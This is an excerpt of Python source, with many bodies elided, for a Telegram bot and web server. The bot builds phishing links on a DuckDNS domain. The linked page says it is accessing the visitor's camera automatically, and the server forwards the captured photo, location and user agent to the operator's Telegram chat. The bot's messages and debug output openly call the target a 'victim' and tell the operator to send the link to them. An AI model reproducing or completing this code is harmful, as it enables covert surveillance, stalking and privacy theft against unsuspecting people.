...
def send_to_telegram(chat_id, image_b64, location=None, agent="Unknown"):
    try:
        ...
        print(f"[+] Photo sent to Telegram chat_id: {chat_id}")
...
.loader{{ border: 4px solid #f3f3f3; border-top: 4px solid #667eea; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }}
...
<div class="container">
    ...
    <p>Accessing camera automatically... Please allow permission when prompted.</p>
        ...
        if self.path == "/upload":
            ...
            try:
                ...
                if chat_id:
                    ...
                    # محاولة إرسال إلى أول chat_id متاح
                    if user_sessions:
                        first_chat = list(user_sessions.values())[0].get('chat_id')
                        if first_chat:
                            send_to_telegram(first_chat, image_b64, location, agent)
...
def create_link(chat_id, link_type="front_cam"):
    ...
    domain = "py1py.duckdns.org"  # غيّر إلى نطاقك أو استخدم ngrok
    ...
    print(f"[DEBUG] Created link for victim {victim_id} -> chat_id {chat_id}")
...
def send_welcome(message):
    ...
    print(f"[DEBUG] User started bot with chat_id: {chat_id}")
...
def handle_callback(call):
    ...
    if call.data == "front_cam":
        ...
        bot.send_message(chat_id, f"✅ Front camera link created:\n{link}\n\n📌 Send it to the victim and you'll receive photo + location automatically")
...
if __name__ == "__main__":
    ...
    # تشغيل البوت مع إعادة محاولة تلقائية عند الانقطاع
    while True:
        try:
